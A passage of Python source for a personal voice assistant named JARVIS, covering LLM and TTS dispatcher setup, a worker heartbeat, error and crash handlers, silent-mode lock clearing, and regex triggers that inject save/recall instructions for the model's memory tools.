    _vad_deactivation = float(os.environ.get("JARVIS_VAD_DEACTIVATION_THRESHOLD", "0.35"))
    _vad_min_speech = float(os.environ.get("JARVIS_VAD_MIN_SPEECH_S", "0.05"))
    _vad_min_silence = float(os.environ.get("JARVIS_VAD_MIN_SILENCE_S", "0.70"))
    _vad_prefix_pad = float(os.environ.get("JARVIS_VAD_PREFIX_PAD_S", "0.50"))
    proc.userdata["vad"] = silero.VAD.load(
        activation_threshold=_vad_activation,
        deactivation_threshold=_vad_deactivation,
        min_speech_duration=_vad_min_speech,
        min_silence_duration=_vad_min_silence,
        prefix_padding_duration=_vad_prefix_pad,
    )
    logger.info(
        f"Silero VAD loaded in prewarm "
        f"(activation={_vad_activation}, deactivation={_vad_deactivation}, "
        f"min_speech={_vad_min_speech}, min_silence={_vad_min_silence}, "
        f"prefix_pad={_vad_prefix_pad})"
    )
    _spawn_worker_heartbeat()


def _pick_supervisor_llm(*, subagent_tools, legacy_llm):
    """Returns the legacy dispatcher LLM. Pre-2026-05-10 this was a
    feature-flag picker for the LangGraph supervisor (gated behind
    `JARVIS_LANGGRAPH_SUPERVISOR=1`); the alt supervisor was deleted
    after sitting default-off through 2 spec-review cycles with no
    plan to flip it on. `subagent_tools` arg kept for call-site
    compatibility but no longer used."""
    return legacy_llm


# Silent-mode stale-lock auto-clear threshold. If the silent flag
# file is older than this when a new session starts, we treat the
# silence as accidental persistence (e.g. user said "go quiet" hours
# ago and forgot, OR LLM hallucinated a mute that auto-engaged) and
# clear it. Live failure 2026-05-08 01:33–01:36: silent flag was set
# in a prior session; user reconnected after the SFU disconnect at
# 01:30 and JARVIS dropped 30 turns silently for 3 minutes before the
# user said "Jarvis sounds like it's broken" then "Jarvis, wake up".
# 4 hours preserves deliberate short-term mutes ("be quiet, I'm on a
# call") while preventing multi-hour silent traps.
_SILENT_MODE_STALE_HOURS = 4


def _clear_stale_silent_mode() -> None:
    """Auto-clear silent-mode flag if it's older than the stale
    threshold. Called once at the start of every entrypoint() so a
    reconnecting user isn't trapped by an old silent-mode lock."""
    try:
        if not _SILENT_MODE_FILE.exists():
            return
        import time as _time
        age_s = _time.time() - _SILENT_MODE_FILE.stat().st_mtime
        if age_s > _SILENT_MODE_STALE_HOURS * 3600:
            _set_silent(False)
            logger.warning(
                f"[silent-mode] auto-cleared stale lock "
                f"(age={age_s/3600:.1f}h > {_SILENT_MODE_STALE_HOURS}h threshold). "
                f"User said 'go quiet' a long time ago; treating as accidental "
                f"persistence. They'll need to re-mute if they wanted it on."
            )
        else:
            logger.info(
                f"[silent-mode] preserved active lock "
                f"(age={age_s/60:.1f}m, threshold={_SILENT_MODE_STALE_HOURS}h)"
            )
    except Exception as e:
        logger.debug(f"[silent-mode] stale-clear check failed: {e}")


def _build_llm_stack() -> dict:
    """Assemble the LLM/TTS providers + LangGraph slow-path classifier
    that AgentSession consumes. Step 8a of the 10/10 refactor —
    factored out of entrypoint() so the LLM-stack build is a single
    named phase rather than ~60 inline lines.

    Returns a dict with the eight pieces of state the rest of
    entrypoint() needs:
      - speech_id       : str        — tray-pick id, for telemetry
      - speech_llm      : groq.LLM   — single-LLM fallback path
      - dispatch_llm    : DispatchingLLM | None — Maya per-route LLM
      - dispatch_tts    : DispatchingTTS | None — Maya per-route TTS
      - turn_graph      : LangGraph slow-path | None
      - turn_classifier : LangChain classifier | None
      - llm_arg         : LLM passed to AgentSession (dispatcher.fallback
                          when active, else speech_llm)
      - tts_arg         : TTS passed to AgentSession (same pattern)

    Env flags honoured:
      - JARVIS_DISPATCH_DISABLED=1  → skip Maya dispatcher, fall back
      - JARVIS_GRAPH_DISABLED=1     → skip LangGraph slow-path
    """
    active_speech_id, active_speech_llm = make_speech_llm()

    # If the user explicitly picked a non-default speech model in the
    # tray, treat that as the **TASK-route override** by default
    # (`JARVIS_PIN_ALL_ROUTES=0`, the new default per global review §P0-12):
    # BANTER stays on the 8b fast-path; REASONING stays on qwen3-32b;
    # EMOTIONAL stays on llama-4-scout. The pin replaces only TASK so
    # the user gets their picked model for "real work" turns without
    # losing the latency win on backchannels.
    #
    # Set `JARVIS_PIN_ALL_ROUTES=1` to restore the previous "pin overrides
    # everything" behavior — useful if the user genuinely wants their
    # picked model for short banter too (e.g. testing a specific model's
    # personality).
    #
    # Live discovery 2026-05-11: user picked Claude Haiku 4.5 and
    # reported "replies sound the same" — they were still Groq, because
    # of the unconditional pin-disables-dispatcher branch. 2026-05-16
    # global review found the reverse problem: pinning llama-3.3-70b
    # for cost defeated BANTER's 8b fast-path on "Hi Jarvis" turns
    # (TTFW jumped from ~700ms to ~5s).
    user_pinned_llm = active_speech_id != DEFAULT_SPEECH_MODEL
    pin_all_routes = os.environ.get("JARVIS_PIN_ALL_ROUTES", "0") == "1"

    # Maya-class dispatcher build.
    if user_pinned_llm and pin_all_routes:
        # Legacy behavior — user explicitly opted in via env var.
        dispatch_llm = None
        dispatch_tts = None
        # NOTE: llm_arg set here is OVERWRITTEN below — the pinned path sets
        # dispatch_llm=None, so the graph-else branch (further down) resets
        # llm_arg to the single-LLM path. The JARVIS_PIN_FALLBACK_MODEL wrap is
        # therefore applied THERE, at the terminal site, not here (fixing the
        # 2026-07-02 bug where wrapping only here was a silent no-op).
        llm_arg = active_speech_llm
        tts_arg = tts.FallbackAdapter(_build_tts_chain())
        logger.info(
            f"[dispatch] user-pinned speech LLM ({active_speech_id}) — "
            f"per-route dispatcher disabled (JARVIS_PIN_ALL_ROUTES=1), "
            f"all turns go through this model"
        )
    elif os.environ.get("JARVIS_DISPATCH_DISABLED", "0") != "1":
        try:
            # When user_pinned_llm is True (and we're in the new
            # default mode, not JARVIS_PIN_ALL_ROUTES), the pin replaces
            # only the TASK route. The 8b BANTER fast-path, qwen
            # REASONING path, and llama-4-scout EMOTIONAL path stay
            # on their specialist defaults. Per global review §P0-12.
            task_override = active_speech_llm if user_pinned_llm else None
            # Ensure the pinned LLM has a `_jarvis_label` — the dispatcher
            # log and the turn-telemetry `llm_used` field both fall back
            # to `repr(llm)` (giving "livekit.plugins.groq.services.LLM")
            # when this is missing. Use the tray pick's ID as the label.
            if task_override is not None and not getattr(task_override, "_jarvis_label", None):
                try:
                    task_override._jarvis_label = active_speech_id
                except Exception:
                    pass
            dispatch_llm = _build_dispatching_llm(task_override=task_override)
            dispatch_tts = _build_dispatching_tts()
            llm_arg = dispatch_llm.fallback   # default; per-turn callback overrides
            tts_arg = dispatch_tts.fallback
            logger.info("[dispatch] LLM dispatcher resolved: " + ", ".join(
                f"{r}={getattr(llm, '_jarvis_label', repr(llm))}"
                for r, llm in dispatch_llm.inners.items()
            ))
            logger.info("[dispatch] TTS dispatcher resolved: " + ", ".join(
                f"{r}={getattr(t, 'voice_id', repr(t))}"
                for r, t in dispatch_tts.inners.items()
            ))
        except Exception as e:
            logger.error(f"[dispatch] dispatcher build failed: {e}; reverting to single-LLM")
            dispatch_llm = None
            dispatch_tts = None
            llm_arg = active_speech_llm
            tts_arg = tts.FallbackAdapter(_build_tts_chain())
    else:
        dispatch_llm = None
        dispatch_tts = None
        llm_arg = active_speech_llm
        tts_arg = tts.FallbackAdapter(_build_tts_chain())

    # LangGraph slow-path dispatcher + classifier. Default-on; kill via
    # JARVIS_GRAPH_DISABLED=1. The graph handles classifier → swap_route
    # → inject_prefix → tune_interrupt; the synchronous BANTER fast-path
    # stays inline elsewhere so listeners can complete the swap before
    # the framework reads session._llm.
    turn_graph = None
    turn_classifier = None
    if (
        dispatch_llm is not None
        and os.environ.get("JARVIS_GRAPH_DISABLED", "0") != "1"
    ):
        try:
            from pipeline.turn_graph import build_turn_graph, make_classifier
            turn_graph = build_turn_graph()
            turn_classifier = make_classifier()
            logger.info(
                f"[turn-graph] active "
                f"(classifier={'configured' if turn_classifier else 'disabled (no key)'})"
            )
        except Exception as e:
            logger.error(f"[turn-graph] build failed; falling back to inline: {e}")
    else:
        # Pre-refactor quirk preserved 2026-05-10: when the slow-path
        # graph is unavailable (either explicitly disabled or because
        # the dispatcher build failed), the original code overrode
        # llm_arg / tts_arg to the single-LLM path. This branch keeps
        # that behavior so dispatcher-only-without-graph traffic still
        # goes through the speech_llm + FallbackAdapter chain rather
        # than the dispatcher's fallback. Audit if telemetry shows
        # this is suboptimal.
        #
        # This is the TERMINAL llm_arg for the PINNED path (pin sets
        # dispatch_llm=None → lands here) plus the dispatch-disabled and
        # dispatcher-build-failed paths. wrap_pin_fallback arms the
        # JARVIS_PIN_FALLBACK_MODEL rung HERE so it survives to the
        # session — wrapping only at the pin branch above was a no-op
        # because this line reset it (2026-07-02 audit).
        llm_arg = _wrap_pin_fallback(active_speech_llm, active_speech_id)
        tts_arg = tts.FallbackAdapter(_build_tts_chain())

    return {
        "speech_id":       active_speech_id,
        "speech_llm":      active_speech_llm,
        "dispatch_llm":    dispatch_llm,
        "dispatch_tts":    dispatch_tts,
        "turn_graph":      turn_graph,
        "turn_classifier": turn_classifier,
        "llm_arg":         llm_arg,
        "tts_arg":         tts_arg,
    }




def _spawn_screen_share_watcher(session) -> None:
    """No-op since the subagent/computer-use teardown.

    The tray-screen-share file watcher streamed per-frame vision
    descriptions via ``tools.computer_use._live_screen_polling`` (the
    vision backend), which was removed. The ``set_screen_share`` tool
    (which toggles the WebRTC track) is unaffected; only the live
    per-frame narration loop is gone. A later wave can re-add frame
    narration once a vision backend is re-ported. Kept as a stub so the
    entrypoint call site is unchanged."""
    return


def _spawn_worker_heartbeat() -> None:
    """Drop a /tmp/jarvis-worker-heartbeat timestamp every 3 s so the
    supervisor's main-sd-watchdog can prove the worker subprocess is
    alive. Step 8b of the 10/10 refactor (2026-05-10), reworked
    2026-05-15.

    Runs as a daemon thread spawned from `prewarm()` (per worker
    subprocess), NOT as an asyncio task inside `entrypoint()` (per
    job). Why the rework: the asyncio-task version only fired once a
    client joined a LiveKit room. An idle worker never wrote the file,
    the supervisor watchdog withheld WATCHDOG=1 after its 60 s grace,
    and systemd SIGABRTed the entire process tree at WatchdogSec=120s
    — chicken-and-egg, since no client could connect to a worker that
    kept dying. Daemon-thread version writes regardless of jobs, so a
    fresh service stays alive until the first connection.

    Trade-off: a thread can't detect an asyncio-loop wedge (a sync
    call blocking the loop won't block this thread). The 2026-05-04
    incident class motivating wedge-detect is still covered by
    resilience/watchdog.py running inside the loop; this file proves
    only the worker subprocess (interpreter + thread scheduler) is
    alive. Idempotent: multiple worker subprocesses writing the same
    file is fine — atomic rename, time.monotonic() is system-wide on
    Linux."""
    # Cross-platform tmp path: Linux still resolves to /tmp/jarvis-worker-heartbeat,
    # Windows to %TEMP%\jarvis-worker-heartbeat. Both branches of the watchdog
    # (producer + consumer) go through tempfile.gettempdir() so they meet.
    import tempfile as _tempfile_hb
    HEARTBEAT_PATH = Path(_tempfile_hb.gettempdir()) / "jarvis-worker-heartbeat"
    import threading as _threading

    def _heartbeat_loop() -> None:
        # PID-scoped .tmp filename so 4 worker subprocesses don't race
        # on the same file — pre-fix log showed dozens of `[worker-
        # heartbeat] write failed: No such file or directory:
        # '/tmp/jarvis-worker-heartbeat.tmp' -> '/tmp/jarvis-worker-heartbeat'`
        # per minute because one worker's `replace()` consumed the .tmp
        # before the next worker's `replace()` could find it. Atomic
        # rename to the SAME target file is fine — the target is the
        # shared latched heartbeat — but the .tmp source must be unique.
        if os.name == "nt":
            # Windows can't share one latched heartbeat across the 4
            # prewarmed worker subprocesses: replace() over a file another
            # process holds open raises WinError 32 (sharing violation) /
            # WinError 2 / PermissionError, so the shared file went stale and
            # the log filled with `[worker-heartbeat] write failed` every 3 s
            # (caught on the 2026-06-18 Windows deploy). Each process instead
            # writes its OWN file (jarvis-worker-heartbeat.<pid>) with a plain
            # truncating write — no cross-process rename, no contention. The
            # main-sd-watchdog reads the freshest across all of them.
            own = HEARTBEAT_PATH.with_name(HEARTBEAT_PATH.name + f".{os.getpid()}")
            while True:
                try:
                    own.write_text(str(time.monotonic()), encoding="utf-8")
                except Exception as e:
                    logger.warning(f"[worker-heartbeat] write failed: {e}")
                time.sleep(3.0)
        tmp = HEARTBEAT_PATH.with_suffix(f".tmp.{os.getpid()}")
        while True:
            try:
                tmp.write_text(str(time.monotonic()))
                tmp.replace(HEARTBEAT_PATH)
            except Exception as e:
                logger.warning(f"[worker-heartbeat] write failed: {e}")
            time.sleep(3.0)

    _threading.Thread(
        target=_heartbeat_loop,
        name="worker-heartbeat",
        daemon=True,
    ).start()


def _register_session_error_handlers(session) -> None:
    """Wire up the `@session.on("error")` handler — Step 8c of the
    10/10 refactor. Two error classes are surfaced:

      * LLM validation errors (`tool call validation failed` /
        `APIConnectionError`) — voice a "had trouble, rephrase?"
        fallback so the conversation continues instead of going
        silent. Throttled to 1 voiced apology per 15 s.

      * TTS errors (`TTSError`) — append the unspoken text to
        `~/.jarvis/tts-failures.log`, pop a desktop notification once
        per 60 s, and log a WARNING. Classifies the error so the
        notification reads "rate-limited" / "timed out" / "bad
        request" / etc. instead of always "rate-limited" (which was
        misleading for the timeout-heavy reality).

    Both handlers are throttled because the framework's retry loops
    can flap fast and would otherwise spam the user with notifications
    or apology voices.
    """
    _tts_fail_marker = Path.home() / ".jarvis" / "tts-failures.log"
    _last_notify_ts = [0.0]   # boxed so the closure can mutate it
    # Throttle the LLM-error fallback voice so a flapping bug doesn't
    # spam "had trouble, try again" every 200ms during retry loops.
    _llm_fallback_last_ts = [0.0]

    @session.on("error")
    def _on_error(ev) -> None:
        try:
            from livekit.agents import tts as _lk_tts  # local to avoid top-level slow path
            err = getattr(ev, "error", None)

            # ── LLM error fallback voice (Phase 9.2) ──────────────────
            # When the recurring 'tool call validation failed' bug fires
            # (LLM jams JSON args into tool_call.name field), the
            # framework's retry loop exhausts and JARVIS goes silent.
            # User has no idea what happened. Catch the malformed-tool-
            # call class of APIConnectionError and voice a fallback so
            # the conversation continues. Throttled to 1/15s so a tight
            # retry loop doesn't bury the user in apologies.
            try:
                from livekit.agents import APIConnectionError as _APIConnectionError
                from livekit.agents import llm as _lk_llm
                err_msg = str(err) if err else ""
                is_llm_validation_err = (
                    isinstance(err, _APIConnectionError)
                    or "tool call validation failed" in err_msg
                    or "Connection error" in err_msg  # the wrapper symptom
                )
                if is_llm_validation_err:
                    now_ts = time.time()
                    if now_ts - _llm_fallback_last_ts[0] > 15.0:
                        _llm_fallback_last_ts[0] = now_ts
                        # session.say is sync in livekit-agents 1.5+,
                        # returns a SpeechHandle. Calling it directly
                        # dispatches synthesis on the framework's task.
                        try:
                            session.say(
                                "Sorry, I had trouble with that. "
                                "Could you rephrase?",
                                allow_interruptions=True,
                            )
                            # Label by actual error source (the same handler
                            # catches stt_error too — the apology log was
                            # misleading when investigating cascades).
                            src = "STT" if "stt_error" in err_msg else (
                                "LLM" if "llm_error" in err_msg else "session"
                            )
                            logger.info(
                                f"[llm-fallback] voiced apology after {src} error: {err_msg[:120]!r}"
                            )
                        except Exception as say_err:
                            logger.debug(f"[llm-fallback] say() failed: {say_err}")
                    return  # don't fall through to TTS-error branch
            except ImportError:
                pass  # framework's APIConnectionError import shape changed

            # Non-TTS provider error (LLM / STT / session) that ISN'T the
            # tool-call-validation bug handled above → classify it and SAY
            # exactly what went wrong ("I'm out of credits on Claude") instead
            # of going silent on a bare status code. Throttled 1 spoken alert/15s.
            if not isinstance(err, _lk_tts.TTSError):
                now_ts = time.time()
                if now_ts - _llm_fallback_last_ts[0] <= 15.0:
                    return
                _llm_fallback_last_ts[0] = now_ts
                classified = classify_provider_error(
                    err,
                    model=_active_voice_model(),
                    component="stt" if "stt_error" in (str(err) or "") else "llm",
                )
                try:
                    session.say(classified.spoken, allow_interruptions=True)
                except Exception as say_err:
                    logger.debug(f"[provider-error] say() failed: {say_err}")
                _notify_error(classified)
                logger.warning(
                    "[provider-error] spoke %s (%s): %s",
                    classified.category, classified.provider, str(err)[:160],
                )
                return
            # Best-effort grab of the in-flight text — if we can't,
            # at least log the timestamp and error message.
            failed_text = getattr(err, "input_text", "") or getattr(err, "text", "")
            now = time.time()
            stamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(now))
            try:
                _tts_fail_marker.parent.mkdir(parents=True, exist_ok=True)
                with _tts_fail_marker.open("a", encoding="utf-8") as f:
                    f.write(f"[{stamp}] {err}\n")
                    if failed_text:
                        f.write(f"  text: {failed_text[:500]}\n")
            except Exception as _e:
                logger.debug(f"[tts-fail] log write failed: {_e}")
            # Classify via the shared provider-error classifier so the
            # notification says what actually broke (rate-limited / timed out /
            # out of credits / bad request) instead of a generic label. TTS
            # errors are notification-only — you can't SPEAK an error when
            # speech synthesis itself is what failed.
            classified = classify_provider_error(
                err, model=_active_voice_model(), component="tts"
            )
            title = classified.notify_title
            body = classified.notify_body

            # Throttle notifications to one per 60 s so a flood of
            # retries doesn't spam the desktop.
            if now - _last_notify_ts[0] > 60:
                _last_notify_ts[0] = now
                try:
                    _subprocess.Popen(
                        ["notify-send", "-u", "normal", "-t", "6000",
                         title, body],
                        stdout=_subprocess.DEVNULL,
                        stderr=_subprocess.DEVNULL,
                    )
                except FileNotFoundError:
                    pass  # notify-send not installed; the log file is enough
            logger.warning(f"TTS error logged to {_tts_fail_marker}: {err}")
        except Exception as e:
            logger.debug(f"_on_error handler hiccup: {e}")


def _register_session_crash_watchdog(session, bg_tasks: set) -> None:
    """Wire up the `@session.on("close")` watchdog — Step 8c of the
    10/10 refactor. When Groq STT has a transient network failure,
    the framework retries 3 times then marks the session
    "unrecoverable". The worker process stays alive but the
    AgentSession is dead — JARVIS goes silent with no feedback.
    Detect this via `CloseEvent.error` and trigger a voice-client
    restart so `_agent_presence_watchdog` forces a fresh room + new
    AgentSession (~5-8 s total recovery time)."""

    @session.on("close")
    def _on_session_close(ev) -> None:
        err = getattr(ev, "error", None)
        if err is None:
            return  # clean shutdown (model switch, tray quit) — don't restart
        classified = classify_provider_error(err, model=_active_voice_model())
        if not classified.recoverable:
            # A restart can't heal billing/auth/quota. Tell the user EXACTLY
            # what's wrong (explicit desktop notification) instead of silently
            # giving up, and don't loop the voice-client.
            logger.error(
                "[session-watchdog] non-recoverable %s — NOT restarting "
                "(a bounce can't add credits or fix a key). err=%s",
                classified.category, str(err)[:200],
            )
            _notify_error(classified)
            return
        logger.error(
            "[session-watchdog] AgentSession died (%s): %s. "
            "Scheduling voice-client restart in 3s.",
            classified.category, str(err)[:160],
        )
        t = asyncio.create_task(
            _restart_voice_client_after_crash(), name="session-watchdog-restart"
        )
        bg_tasks.add(t)
        t.add_done_callback(bg_tasks.discard)


# Kill-phrase regex used by the mid-speech interrupt handler. Module-level
# so `_register_state_tracking_handlers` doesn't recompile on every job.
# Per-route min_words=2-3 means single-word "stop" or "wait" won't fire
# the framework's interrupt under REASONING or EMOTIONAL turns. We watch
# partial transcripts for explicit kill phrases and call session.interrupt()
# directly — bypassing min_words.
_KILL_PHRASES = re.compile(
    r"\b("
    r"stop|wait|hold on|shut up|hush|pause|quiet|enough|cancel|nevermind|never mind"
    # Polite-stop phrases. User naturally says these to mean "let me speak"
    # but framework VAD/duration thresholds often miss them on short audio.
    r"|one sec|one second|give me a (sec|second|moment)|hold up|hang on"
    r")\b",
    re.IGNORECASE,
)

# ─── Save / recall triggers (Spec 2026-05-24, Track 1) ──────────────────────
#
# Liberal-by-design regex. Matches are necessary-but-not-sufficient: the
# supervisor LLM is the second gate and decides whether to actually save.
# A "false positive" here just costs ~50 tokens of inject prompt; it does
# NOT cause a bad memory write.
#
# Gated by JARVIS_SAVE_TRIGGER_LIVE / JARVIS_RECALL_TRIGGER_LIVE env vars
# (default shadow — log match, don't inject).

_SAVE_TRIGGER_RE = re.compile(
    r"""(?ix)
    (?:^|[.?!,\s])\s*
    (?:
        # 'remember <anything>' EXCEPT 'remember when/if' (those are recall
        # phrasings handled by _RECALL_TRIGGER_RE). Liberal by design — the
        # supervisor LLM is the 2nd gate per the spec's two-gate design.
        # The narrower (?:this|that|me|to) form rejected the most natural
        # phrasing 'remember I'm allergic to fish' (no object-deictic word),
        # so widened to a negative lookahead. Live audit, 2026-05-24.
        remember\b\s+(?!when\b|if\b)
      | save\s+(?:this|that|it)\b
      | don'?t\s+forget\b
      | write\s+this\s+down\b
      | memori[sz]e\s+(?:this|that|it|for)\b
    )
    """
)

_RECALL_TRIGGER_RE = re.compile(
    r"""(?ix)
    (?:^|[.?!,\s])\s*
    (?:
        do\s+you\s+remember\b
      | what\s+did\s+i\s+tell\s+you\b
      | have\s+i\s+told\s+you\b
      | remind\s+me\s+(?:about|of|what)\b
    )
    """
)

_SAVE_TRIGGER_SYSTEM_MESSAGE = (
    "USER REQUESTED A SAVE. Identify the durable fact / preference / "
    "procedure in their message and call `memory()` (target='user' for "
    "facts about Ulrich, 'memory' for environment notes, 'procedure' for "
    "named multi-step processes — supply 'name' as a kebab-case identifier) "
    "BEFORE replying. Then reply with a short acknowledgment ('got it' / 'saved')."
)

_RECALL_TRIGGER_SYSTEM_MESSAGE = (
    "USER REQUESTED A RECALL. Call `recall(query=<their question>)` FIRST "
    "to fetch what you know about them from past conversations. Use the "
    "returned context to answer. Do NOT reply 'this conversation just "
    "started' or 'I don't have prior context'."
)

# ─── Procedure offer helpers (Spec 2026-05-24, Track 2.5) ───────────────────
#
# After a successful multi-step task (_is_successful_trajectory gate), JARVIS
# appends a one-line offer so the user can save the trajectory as a named
# procedure. On the next turn, a yes-shape confirmation applies the procedure
# via _handle_memory(target='procedure'). State is in-memory per room_id with
# a 60-second TTL. Kill switch: JARVIS_PROCEDURE_CAPTURE_DISABLED=1.

_INTENT_OBJECT_RE = re.compile(
    r"""(?ix)
    (?:^|,|\.|\bcan\s+you\s+|\bjarvis,?\s+)\s*
    (?P<verb>deploy|find|set\s+up|build|debug|configure|install|
            create|update|push|publish|launch|run|fix|search|check|
            open|close|send|post|book|order)\s+
    (?:me\s+|the\s+|a\s+|an\s+)?
    (?P<obj>[a-z0-9]+(?:\s+[a-z0-9]+){0,2})
    """
)


def _derive_procedure_name(user_text: str) -> "str | None":
    """Auto-derive a kebab-case name from the user's request.
    Returns None if we can't find an intent verb + object."""
    if not user_text:
        return None
    m = _INTENT_OBJECT_RE.search(user_text)
    if not m:
        return None
    verb = m.group("verb").strip().lower().replace(" ", "-")
    obj_words = m.group("obj").strip().lower().split()
    # Skip articles/connectors in the object phrase
    skip = {"the", "a", "an", "me", "to", "for", "from", "in", "on"}
    obj_filtered = [w for w in obj_words if w not in skip]
    if not obj_filtered:
        return verb
    return f"{verb}-{obj_filtered[0]}"


def _build_offer_phrase(name: str) -> str:
    """The one-line offer appended to JARVIS's reply when a successful
    multi-step task completes and a name can be derived from the intent."""
    return f"Want me to keep these steps as '{name}' for next time?"


_CONFIRMATION_RE = re.compile(
    r"(?i)^\s*(?:yeah|yes|yep|sure|ok|okay|save\s+it|please\s+do|"
    r"do\s+it|absolutely|definitely)\b"
)


def _is_procedure_confirmation(user_text: str) -> bool:
    """True if the user's next turn confirms the pending procedure offer."""
    if not user_text:
        return False
    return bool(_CONFIRMATION_RE.search(user_text.strip()))


# Spec 2026-05-24, Track 2.5 — pending procedure offers keyed by room id.
# In-memory only; lost on service restart (acceptable UX cost).
_PENDING_PROCEDURE_OFFERS: "dict[str, dict]" = {}


def _maybe_inject_trigger_message(chat_ctx, user_text: str) -> "str | None":
    """Run save/recall trigger regex on user_text. If a trigger fires AND
    the corresponding LIVE env var is set, inject a system message into
    chat_ctx and return 'save' / 'recall'. In shadow mode (LIVE unset),
    log the match and return 'save_shadow' / 'recall_shadow' but do NOT
    inject. Returns None if no trigger matched.

    Spec 2026-05-24, Track 1. The regex is liberal; the supervisor LLM
    is the second gate."""
    text = (user_text or "").strip()
    if not text:
        return None

    # Check RECALL first — the recall regex is specific (4 patterns); the
    # save regex is liberal (catches "remember <anything>" except when/if).
    # On overlap ("do you remember Shelby?" matches BOTH), recall should
    # win because it's the more specific intent classification.
    recall_match = bool(_RECALL_TRIGGER_RE.search(text))
    if recall_match:
        live = os.environ.get("JARVIS_RECALL_TRIGGER_LIVE", "0") == "1"
        mode = "live" if live else "shadow"
        logger.info(
            "[trigger] recall_trigger matched: user_text=%r (mode=%s)",
            text[:120], mode,
        )
        if live:
            try:
                chat_ctx.add_message(role="system", content=_RECALL_TRIGGER_SYSTEM_MESSAGE)
                return "recall"
            except Exception as e:
                logger.warning("[trigger] recall_trigger inject failed: %s", e)
                return "recall_shadow"
        return "recall_shadow"

    save_match = bool(_SAVE_TRIGGER_RE.search(text))
    if save_match:
        live = os.environ.get("JARVIS_SAVE_TRIGGER_LIVE", "0") == "1"
        mode = "live" if live else "shadow"
        logger.info(
            "[trigger] save_trigger matched: user_text=%r (mode=%s)",
            text[:120], mode,
        )
        if live:
            try:
                chat_ctx.add_message(role="system", content=_SAVE_TRIGGER_SYSTEM_MESSAGE)
                return "save"
            except Exception as e:
                logger.warning("[trigger] save_trigger inject failed: %s", e)
                return "save_shadow"
        return "save_shadow"

    return None


def _register_state_tracking_handlers(session) -> None:
    """Wire up the 5 small `@session.on(...)` handlers that mirror VAD
    + agent state into telemetry, tray flags, and barge-in detection.
    Step 8d of the 10/10 refactor.

    Registered:
      - user_state_changed → stamp speech start/end on session for
        the dispatcher's speech_rate_wpm derivation.
      - agent_state_changed → mirror state into _AGENT_THINKING_FILE +
        _TOOL_BUSY_FILE so the tray + /status endpoint reflect reality
        without TTL guesswork. Also accumulates total_audio_ms across
        multi-segment turns.
      - user_input_transcribed → mark thinking start + reset the per-turn
        tool-call counter on each FINAL transcript.
      - user_input_transcribed → kill-phrase fast interrupt. Watches
        for "stop" / "wait" / "hush" / etc. mid-speech and calls
        session.interrupt() directly, bypassing per-route min_words
        which would otherwise drop single-word interrupts.
      - user_state_changed → barge-in detection. Stamps
        _jarvis_was_interrupted=True when the user starts speaking
        while the agent is still mid-utterance.
    """
    # Echo-aware barge-in: clear any speaking-text carried over from a prior
    # job on this worker process (process-local tracker; one job per session).
    try:
        from pipeline import speaking_tracker
        speaking_tracker.reset()
    except Exception:
        pass

    @session.on("user_state_changed")
    def _on_user_state(ev) -> None:
        try:
            new_state = getattr(ev, "new_state", None)
            old_state = getattr(ev, "old_state", None)
            now = time.monotonic()
            if new_state == "speaking" and old_state != "speaking":
                session._jarvis_speech_started_at = now
            elif old_state == "speaking" and new_state != "speaking":
                session._jarvis_speech_ended_at = now
        except Exception as e:
            logger.debug(f"[acoustic] state-change skipped: {e}")

    # Mirror the framework's authoritative agent_state into the
    # thinking flag file so the tray can stay amber for the FULL
    # duration of LLM + tool work — no TTL guesswork. Captured live
    # 2026-05-02: tray reverted to green during a 15s browser_v2
    # task because the prior 10s TTL on _AGENT_THINKING_FILE expired
    # mid-tool. Refreshing the flag on every state change beats the
    # TTL into irrelevance.
    #
    # ALSO clears the _TOOL_BUSY_FILE flag when state returns to
    # idle/listening/speaking. Captured live 2026-05-02 13:28: the
    # desktop subagent emitted a screenshot description as text but
    # skipped task_done, so the tool-busy flag from the transfer
    # never got cleared — tray stayed amber for 7 minutes and
    # `/status.tool_running` reported True forever. Trusting the
    # framework's state machine over per-tool cleanup is the robust fix.
    @session.on("agent_state_changed")
    def _on_agent_state(ev) -> None:
        new_state = getattr(ev, "new_state", None)
        old_state = getattr(ev, "old_state", None)
        # Any return to active work aborts a pending idle backstop-cancel
        # of the thinking heartbeat (scheduled in the idle/listening branch
        # below) — the turn isn't over after all.
        if new_state in ("thinking", "speaking"):
            _cancel_pending_idle_heartbeat_cancel(session)
        if new_state == "thinking":
            # Heartbeat owns _AGENT_THINKING_FILE now (started in
            # _on_user_input). Don't touch the file here — the framework's
            # transient "listening" state between tool calls would have
            # otherwise unlinked it and made the tray go green.
            # Front-loaded ack (2026-05-24, pre-TTS confab gate). The
            # gate buffers the FULL LLM text before TTS streams, which
            # shifts TTS start from LLM-first-token to LLM-last-token.
            # A 1500 ms timer fires session.say("One moment.") so the
            # user gets perception feedback that JARVIS is working.
            # Threshold bumped 800→1500 ms on 2026-05-27 — cached
            # Anthropic responses arrive in ~700-1000 ms, so the old
            # 800 ms threshold fired right before the real reply and
            # sounded robotic on short turns. 1500 ms means the ack
            # only fires when the LLM is genuinely taking a while.
            #
            # TASK_OTHER excluded — misrouted casual input (e.g.
            # "thank you" → TASK_OTHER, captured 2026-05-27) gets an
            # ack that sounds nonsensical for a one-word reply.
            # BANTER/EMOTIONAL/TASK_OTHER stay snappy (their primary
            # calls return fast and an ack on them feels robotic).
            #
            # AT MOST ONCE PER USER TURN. The `_jarvis_front_ack_fired`
            # flag is turn-scoped — reset in `_on_user_input` on the
            # final transcript, NOT here. The framework re-enters
            # "thinking" multiple times per turn (one per LLM iteration
            # between tool calls, plus the speaking→thinking cycle the
            # ack TTS itself causes); resetting the gate on every entry
            # produced runs of 4+ acks in 3 s — live failure 2026-05-27.
            try:
                if getattr(session, "_jarvis_front_ack_fired", False):
                    pass  # already voiced this turn — skip
                else:
                    route = getattr(session, "_jarvis_route", None) or ""
                    _ACK_ROUTES = (
                        "TASK_DESKTOP", "TASK_BROWSER",
                        "TASK_CODE", "TASK_FILES", "REASONING",
                    )
                    if route in _ACK_ROUTES:
                        async def _front_loaded_ack(_sess=session):
                            try:
                                await asyncio.sleep(1.5)
                                if not getattr(_sess, "_jarvis_front_ack_fired", False):
                                    try:
                                        # Vary the ack phrase so consecutive long
                                        # turns don't all say the same thing —
                                        # users notice "one moment" repetition fast.
                                        # add_to_chat_ctx=False so the ack does NOT
                                        # become an assistant turn in chat_ctx. If it
                                        # did, the next user turn would see two
                                        # consecutive assistant turns (ack + real
                                        # reply) and the supervisor would get confused.
                                        import random
                                        _FRONT_ACK_PHRASES = (
                                            "One moment.",
                                            "On it.",
                                            "Working on it.",
                                            "Let me check.",
